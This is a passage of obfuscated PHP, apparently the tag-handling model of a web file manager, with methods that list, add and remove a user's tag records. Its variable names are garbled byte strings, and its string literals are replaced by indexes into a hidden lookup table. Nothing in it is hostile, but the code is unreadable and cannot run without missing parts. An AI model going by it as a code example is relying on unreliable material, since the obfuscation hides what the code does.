[1963] => array($«ñì„Ù [2342] . USER_ID, $«ñì„Ù [1964])); } protected function listData() { $ŠÄ¯ö‡± =& $_SERVER[³·—™¤¢]; $îÍıò¾¡ = array($ŠÄ¯ö‡±[1671] => USER_ID, $ŠÄ¯ö‡±[484] => array($ŠÄ¯ö‡±[1967], 0)); $èˆÃƒÑ = $ŠÄ¯ö‡±[2343]; $šÓ”ßŞü = $this->field($èˆÃƒÑ)->where($îÍıò¾¡)->order($ŠÄ¯ö‡±[1970])->select(); return $šÓ”ßŞü ? $šÓ”ßŞü : array(); } protected function addToTag($ŸÅİñ³, $ıù«ñƒˆ) { $¥ÅÒ¾Ó =& $_SERVER[³·—™¤¢]; if (!Model($¥ÅÒ¾Ó[2107])->listData($ıù«ñƒˆ)) { return !1; } if (is_numeric($ŸÅİñ³)) { $á“Ñ¯À = Model($¥ÅÒ¾Ó[845])->pathInfo($ŸÅİñ³); if (!$á“Ñ¯À) { return !1; } } else { $á“Ñ¯À = IO::infoSimple($ŸÅİñ³); if (!$á“Ñ¯À) { return !1; } $å€™Œì = $á“Ñ¯À[$¥ÅÒ¾Ó[32]]; $ì³ùõ‚Ë = $á“Ñ¯À[$¥ÅÒ¾Ó[33]]; if (isset($á“Ñ¯À[$¥ÅÒ¾Ó[410]])) { $ì³ùõ‚Ë = $á“Ñ¯À[$¥ÅÒ¾Ó[410]] == $¥ÅÒ¾Ó[88] ? $¥ÅÒ¾Ó[75] : $¥ÅÒ¾Ó[199]; } } $Å¬Ô—×Ã = array($¥ÅÒ¾Ó[1671] => USER_ID, $¥ÅÒ¾Ó[484] => $ıù«ñƒˆ, $¥ÅÒ¾Ó[421] => $ŸÅİñ³, $¥ÅÒ¾Ó[422] => $ì³ùõ‚Ë ? $ì³ùõ‚Ë : $¥ÅÒ¾Ó[416], $¥ÅÒ¾Ó[420] => $å€™Œì ? $å€™Œì : $¥ÅÒ¾Ó[12], $¥ÅÒ¾Ó[1856] => 0); if ($this->where($Å¬Ô—×Ã)->find()) { return !1; } return $this->add($Å¬Ô—×Ã); } protected function removeFromTag($«º†§¸†, $íİ’½¹Ö) { $™ëüÒ†’ =& $_SERVER[³·—™¤¢]; if (!Model($™ëüÒ†’[2107])->listData($íİ’½¹Ö)) { return !1; } if (is_array($«º†§¸†)) { $«º†§¸† = array($™ëüÒ†’[7], $«º†§¸†); } $’ì¿ÍÌ» = array($™ëüÒ†’[1671] => USER_ID, $™ëüÒ†’[484] => $íİ’½¹Ö, $™ëüÒ†’[421] => $«º†§¸†); return $this->where($’ì¿ÍÌ»)->delete(); } protected function removeByTag($çº¯Œ¶‹) { $¦•îø£€ =& $_SERVER[³·—™¤¢]; if (!$çº¯Œ¶‹) { return !1; } $•ä±­ = array($¦•îø£€[1671] => USER_ID, $¦•îø£€[484] => $çº¯Œ¶‹); return $this->where($•ä±­)->delete(); } protected function removeBySource($Ã£Í©‹Ÿ) { $´â´Ç±Ä =& $_SERVER[³·—™¤¢]; if (is_array($Ã£Í©‹Ÿ)) { $Ã£Í©‹Ÿ = array($´â´Ç±Ä[7], $Ã£Í©‹Ÿ); } $ƒ‰Øß = array($´â´Ç±Ä[1671] => USER_ID, $´â´Ç±Ä[484] => array($´â´Ç±Ä[1037], 0), $´â´Ç±Ä[421] => $Ã£Í©‹Ÿ); return $this->where($ƒ‰Øß)->delete(); } }